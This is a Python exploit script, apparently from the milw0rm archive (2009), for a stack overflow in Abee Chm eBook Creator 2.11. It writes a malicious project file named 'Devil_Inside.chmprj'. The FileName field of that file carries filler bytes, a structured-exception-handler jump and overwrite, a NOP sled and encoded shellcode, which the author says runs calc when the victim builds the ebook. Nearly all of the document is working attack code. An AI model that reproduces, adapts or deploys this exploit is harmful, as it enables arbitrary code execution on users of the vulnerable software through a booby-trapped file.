# exploit.py
# Abee Chm eBook Creator 2.11 Stack overflow Exploit
# By:Encrypt3d.M!nd
#
# it's the same exploit i wrote for chm maker,everything is the same!!
# but there's a lil note that when importing 'Devil_Inside.chmprj' a message
# will pops up and tells that the project file format is outdated bla bla but after clicking
# ok it will load into the program,and just go to File>Make Ebook.. and calc
# p.s:you can avoid the message by using chm ebook project data,i'm lazy to do that
# so i've used the chm maker one :D

ns = "\xEB\x06\x90\x90"
sh = "\x05\x67\x35\x45"

shellcode = (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x37\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x61"
"\x58\x30\x41\x31\x50\x41\x42\x6b\x42\x41\x71\x32\x42\x42\x42\x32"
"\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x4d\x39\x69\x6c\x4d"
"\x38\x43\x74\x35\x50\x53\x30\x77\x70\x4e\x6b\x53\x75\x77\x4c\x4c"
"\x4b\x63\x4c\x54\x45\x34\x38\x67\x71\x5a\x4f\x6c\x4b\x62\x6f\x75"
"\x48\x6e\x6b\x41\x4f\x47\x50\x33\x31\x58\x6b\x63\x79\x4e\x6b\x36"
"\x54\x4c\x4b\x45\x51\x68\x6e\x34\x71\x59\x50\x4c\x59\x4c\x6c\x4f"
"\x74\x6f\x30\x72\x54\x47\x77\x58\x41\x39\x5a\x34\x4d\x57\x71\x69"
"\x52\x48\x6b\x69\x64\x67\x4b\x46\x34\x66\x44\x74\x44\x53\x45\x6b"
"\x55\x4c\x4b\x43\x6f\x31\x34\x67\x71\x78\x6b\x63\x56\x4c\x4b\x54"
"\x4c\x62\x6b\x6e\x6b\x31\x4f\x67\x6c\x37\x71\x78\x6b\x4c\x4b\x45"
"\x4c\x4c\x4b\x73\x31\x4a\x4b\x6c\x49\x51\x4c\x74\x64\x67\x74\x6b"
"\x73\x34\x71\x6f\x30\x42\x44\x6c\x4b\x71\x50\x34\x70\x4e\x65\x4f"
"\x30\x62\x58\x46\x6c\x6c\x4b\x41\x50\x44\x4c\x4c\x4b\x42\x50\x65"
"\x4c\x4e\x4d\x6e\x6b\x50\x68\x34\x48\x4a\x4b\x73\x39\x6e\x6b\x4b"
"\x30\x4c\x70\x57\x70\x63\x30\x37\x70\x4e\x6b\x42\x48\x57\x4c\x51"
"\x4f\x56\x51\x48\x76\x31\x70\x73\x66\x6e\x69\x59\x68\x4e\x63\x4f"
"\x30\x73\x4b\x66\x30\x65\x38\x68\x70\x6d\x5a\x34\x44\x51\x4f\x30"
"\x68\x4e\x78\x4b\x4e\x6c\x4a\x54\x4e\x32\x77\x79\x6f\x79\x77\x41"
"\x73\x75\x31\x72\x4c\x41\x73\x57\x70\x61")

header1 = (
'<?xml version="1.0" encoding="Windows-1252" ?>\n'
'<XMLConfig><info>Chm Maker project</info>\n'
'<group name="Contents">\n'
' <group name="0">\n'
'  <param name="Caption">filename</param>\n'
'  <param name="Level">0</param>\n'
'  <param name="FileName">'+"\x41"*320+ns+sh+"\x90"*20+shellcode+"\x41" * 5000)

header2 = (
'</param>\n'
' </group>\n'
' <param name="Count">1</param>\n'
'</group>\n'
'<group name="Keywords">\n'
' <param name="Count">0</param>\n'
'</group>\n'
'<group name="KeywordsFinder">\n'
' <param name="UseMeta">1</param>\n'
' <param name="UseBold">1</param>\n'
' <param name="UseItalic">0</param>\n'
' <param name="UseUnder">0</param>\n'
' <param name="UseHTag">1</param>\n'
' <param name="UseTabHeader">0</param>\n'
' <param name="MaxKeyLength">32</param>\n'
' <param name="LiveUpdate">0</param>\n'
'</group>\n'
'<group name="Customize">\n'
' <param name="MainTitle">kkkkkkkkkkkkkkk</param>\n'
' <param name="DefaultPage"></param>\n'
' <param name="Left">0</param>\n'
' <param name="Top">0</param>\n'
' <param name="Width">0</param>\n'
' <param name="Heigth">0</param>\n'
' <param name="HideShow">1</param>\n'
' <param name="Back">1</param>\n'
' <param name="Forward">1</param>\n'
' <param name="Stop">0</param>\n'
' <param name="Refresh">0</param>\n'
' <param name="Options">1</param>\n'
' <param name="Print">1</param>\n'
' <param name="Font">0</param>\n'
' <param name="Locate">0</param>\n'
' <param name="Home">0</param>\n'
' <param name="HomePage"></param>\n'
' <param name="Jump1">0</param>\n'
' <param name="Jump1Page"></param>\n'
' <param name="Jump1Title"></param>\n'
' <param name="Jump2">0</param>\n'
' <param name="Jump2Page"></param>\n'
' <param name="Jump2Title"></param>\n'
' <param name="Search">1</param>\n'
' <param name="AdditionalFiles"></param>\n'
'</group>\n'
'</XMLConfig>\n'
)


file=open('Devil_Inside.chmprj','w')
file.write(header1+header2)
file.close()

# milw0rm.com [2009-03-30]
